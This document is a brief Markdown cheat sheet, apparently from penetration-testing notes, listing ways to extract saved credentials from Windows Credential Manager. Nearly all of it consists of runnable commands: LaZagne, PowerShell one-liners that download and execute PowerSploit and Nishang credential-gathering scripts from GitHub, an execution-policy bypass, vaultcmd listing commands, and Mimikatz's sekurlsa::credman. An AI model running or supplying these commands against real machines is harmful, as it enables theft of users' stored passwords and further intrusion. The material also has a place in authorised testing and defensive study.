# Credentials Manager

### 1) LaZagne

    LaZagne.exe windows

### 2) Get-VaultCredential (PowerSploit)

    iex (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-VaultCredential.ps1"); Get-VaultCredential

### 3) Get-WebCredentials (Nishang)

    powershell iex (New-Object Net.Webclient).DownloadString("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WebCredentials.ps1"); Get-WebCredentials

### 4) GUI

     Control Panel -> User accounts -> Credential Manager

### 5) Cmd

#### 1) 

    vaultcmd /list

#### 2) 

    vaultcmd /listproperties:"Web Credentials" or "Windows Credentials"

#### 3) 

    vaultcmd /listcreds:"Web Credentials or "Windows Credentials"

#### 4) 

    Powershell.exe -ex bypass

#### 5) 

    Import-Module c:\tools\Get-WebCredentials.ps1

#### 6) 

    Get-WebCredentials.ps1

### 6) Mimikatz

#### 1) 

    mimikatz

#### 2) 

    privilege::debug

#### 3) 

    sekurlsa::credman
